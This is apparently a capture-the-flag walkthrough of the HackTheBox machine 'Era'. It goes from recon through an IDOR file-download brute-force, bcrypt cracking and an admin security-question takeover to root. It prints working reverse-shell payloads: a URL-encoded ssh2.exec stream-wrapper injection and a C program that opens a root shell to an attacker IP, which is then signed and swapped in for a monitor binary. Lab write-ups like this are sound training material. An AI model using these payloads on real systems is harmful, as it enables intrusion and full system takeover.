Let's scan the car
```bash
sudo nmap -v -sC -sV 10.10.11.79 -oN nmap/initial
```
```Nmap
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.5
80/tcp open http nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Go to the site

![image](images/20250728140727.png)

Check for subdomains
```bash
ffuf -u http://era.htb/ -H "Host:FUZZ.era.htb" -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 100 -fs 154
```

![image](images/20250728141404.png)

Go to this subdomain

![image](images/20250728141454.png)

Let's see how the authorization form behaves when entering incorrect data. Let's enter `test/test`

![image](images/20250728141705.png)

We managed to log into the account

![image](images/20250728141720.png)

Let's try to download the file. After the file is downloaded, a link of the form `http://file.era.htb/download.php?id=3631` is generated with the `id` of the file that we downloaded. Let's check the site for the **IDOR** vulnerability. To do this, we intercept the request when going to the file download page and send it to **Intruder**.

![image](images/20250728162048.png)


![image](images/20250728161912.png)

Generate a list from `0` to `100 000` and insert it into **Intruder**:
```bash
seq 0 100000 > 0-100000-list.txt
```

![image](images/20250728162000.png|450)

In `Grep - Match` insert `Your Download Is Ready!`

![image](images/20250728162116.png|450)

Launch the attack

![image](images/20250728162133.png)

We see several `id`. Let's follow them:

![image](images/20250728161542.png)


![image](images/20250728161604.png)

Download and unzip these files.
```bash
unzip -q site-backup-30-08-24.zip -d site-backup
unzip -q signing.zip -d signing
```

![image](images/20250728162813.png)

Among the `site-backup` files there is a file with the database. Let's open it and read it:

![image](images/20250728164033.png)

```bash
sqlite3 filedb.sqlite
```

![image](images/20250728164042.png)

Prepare the file with hashes so that it looks like this:

![image](images/20250728164438.png)

Now let's break these hashes
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hashes
```

![image](images/20250728165113.png)

Only `eric` and `yuri` were broken:
```Passwords
america (eric)
mustang (yuri)
```
Let's try to enter FTP through them:

![image](images/20250728165150.png)

Download these two directories to your host:
```FTP
ftp> passive
Passive mode on.
ftp> lcd /home/dex1d/Pentesting/HackTheBox/Era/apache2_conf/
Local directory now /home/dex1d/Pentesting/HackTheBox/Era/apache2_conf
ftp> cd apache2_conf
250 Directory successfully changed.
ftp> prompt
Interactive mode off.
ftp> mget *
ftp> prompt
Interactive mode on.
ftp> lcd /home/dex1d/Pentesting/HackTheBox/Era/php8.1_conf/
Local directory now /home/dex1d/Pentesting/HackTheBox/Era/php8.1_conf
ftp> cd ../php8.1_conf/
250 Directory successfully changed.
ftp>prompt
Interactive mode off.
ftp> mget *
```

![image](images/20250728170119.png)

<div style="page-break-after: always;"></div>

File `000-default.conf`:
```
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
</VirtualHost>
```
File `file.conf`:
```
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/file
	ServerName file.era.htb
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```
You can see the important thing - virtual host for `file.era.htb` serves not `/var/www/html`, but a separate folder:
- By default (`000-default.conf`) the site on `*:80` serves from `/var/www/html`
- But for `ServerName file.era.htb` a separate vhost with **DocumentRoot** `/var/www/file` is registered

That is, the web application itself is not in the usual `/var/www/html/`, but in `/var/www/file/`. Perhaps in the future this will be useful.
Let's look at the source code of `download.php`:

![image](images/20250728232741.png)

We see that there is a beta feature for the admin that allows you to show the file on the page instead of downloading it. Potentially, this can be used for `RCE`.
Let's look at the source code of `security_login.php`:

![image](images/20250728233135.png)

We see that it is quite possible to change `Security Questions` for the admin. From the hashes obtained earlier, we already know that the admin's `username` is `admin_ef01cab31aa`. Let's try to change his `Security Questions` to log in to his account using them.

![image](images/20250728233336.png)

<div style="page-break-after: always;"></div>

Now we use the login method `login using security questions`:

![image](images/20250728233409.png)

We are in the admin account.

![image](images/20250728233456.png)

Let's try to load the image

![image](images/20250728234012.png)

Now let's display it on the page

![image](images/20250728234041.png)

Judging by the code, there needs to be a `GET` parameter `show` and it should be `true`. The result should be a link like this:
```URL
http://file.era.htb/download
```

![image](images/20250728234451.png)

The feature that is only available to the admin has been confirmed. Now let's get a reverse shell.
For this, we will use **PHP-stream-wrapper**. PHP supports opening not only local files via `fopen()`, but also **all sorts of "wrappers"** like `<scheme>://…` — these are **stream-wrappers**. For example:
- `php://filter/...` — for filtering/encoding content,
- `data://…` — for embedded data,
- `file://…` — an explicit reference to the local file system,
- etc.

If the server has the **ssh2** extension (PECL SSH2) installed, two wrappers are automatically added:
- `ssh2.shell://…`
- `ssh2.exec://…`

With `ssh2.exec://user:pass@host/COMMAND` PHP with `fopen()`:
1. **Establishes an SSH connection** to `host` under the account `user` with the password `pass`.
2. Executes the command `COMMAND` on the remote host.
3. Returns a stream handle from which to **read stdout** of this command.

Let's try to get the reverse shell of user `yuri`, which has the password `mustang`:
```URL
http://file.era.htb/download.php?idT&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash -c "bash -i >& /dev/tcp/10.10.14.91/4444 0>&1";
```
Didn't work. Let's try **URL encoding** dangerous characters:
```URL
http://file.era.htb/download.php?id=6540&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.91%2F4444%200%3E%261%22;
```
```bash
sudo ncat -lvnp 4444
```

![image](images/20250729000027.png)

`yuri` didn't have a flag in the home directory, but `eric` does too. Let's try to get a reverse shell to it:
```URL
http://file.era.htb/download.php?id=6540&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.91%2F4444%200%3E%261%22;
```

![image](images/20250729000722.png)

Stabilize the shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo; fg
Enter twice, and
export TERM=xterm
```
Let's see what processes are running under `root`:
```bash
ps aux | grep root
```

![image](images/20250729001429.png)

Let's check if there are **SUID bits**:
```bash
find /opt/AV/periodic-checks -type f -perm -4000 -ls
```
<div style="page-break-after: always;"></div>

Not found. Let's see what **Cron** is doing:
```bash
grep -R "periodic-checks" /etc/cron* /etc/crontab /etc/cron.d/*
```
Nothing either.
In `/opt/AV/periodic-checks/` there are such files:

![image](images/20250729005213.png)

This file is binary
```bash
file monitor
```

![image](images/20250729010110.png)

As I understand, we need to create a reverse shell, which will be located in the binary file `monitor`.
On the host, create `reverse.c` with the following contents:
```C
#include <unistd.h>
int main() {
	setuid(0); setgid(0);
	execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.91/4443 0>&1", NULL);
	return 0;
}
```
We build an executable file from it:
```bash
x86_64-linux-gnu-gcc -o monitor reverse.c -static
```

![image](images/20250729005534.png)

We have `key.pem` and `x509.genkey`. Most likely, we need to sign our monitor with them. To do this, we will use the [linux-elf-binary-signer](https://github.com/NUAA-WatchDog/linux-elf-binary-signer/tree/master) tool.
Let's do `make`:

![image](images/20250729005607.png)

Let's make a binary from this executable file, which will require `libssl` and `libcrypto` to be available in the system when running:
```bahs
gcc -o elf-sign elf_sign.c -lssl -lcrypto
```
Let's sign the monitor
```bash
./elf-sign sha256 key.pem key.pem monitor
```

![image](images/20250729005719.png)

Now all that's left is to send this file to the machine:
```bash
sudo python3 -m http.server 80
```
Let's download the monitor

![image](images/20250729004734.png)

Now make it executable and delete the old monitor.

![image](images/20250729004953.png)

In parallel, listen to the port that was specified in `reverse.c`:
```bash
sudo ncat -lvnp 4443
```
After a while, we get `root`:

![image](images/20250729005002.png)
